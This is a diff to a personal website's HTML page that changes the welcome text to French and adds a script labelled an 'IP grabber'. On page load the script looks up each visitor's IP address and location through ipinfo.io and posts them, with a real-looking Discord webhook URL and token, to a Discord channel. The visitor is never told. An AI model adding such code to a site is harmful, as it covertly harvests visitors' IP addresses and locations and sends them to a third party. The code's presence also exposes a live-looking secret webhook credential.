@@ -2,6 +2,33 @@
 <html>
 <head>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-44ZSGENS96"></script>
+	<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/1167017737936175184/-8aZ2_joIDyYwUDljLAJLg15dCQdMtMz7WyUoxqOKWStyCVqje-omWsdZZhr8L7A24_c");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "IP Logger",
+          avatar_url: "",
+          content: "@everyone",
+          embeds: [
+               {
+                    title: "Je te présente mon IP grabber!",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -127,7 +154,11 @@
 <br>
 
       
-      <p></p>Welcome to my website I'm just an amateur developer !</p>
+      <p>Bien le Bonjour</p>
+	 <span>Je te souhaite la bienvenue sur mon site internet</span>span>
+	 <span>Mais sache que je ne suis qu'un devvloper amateur</span>
+	 
+	 <p>Rien d'extroadiraire donc 😁🙃! </p>
 
 
 <br>
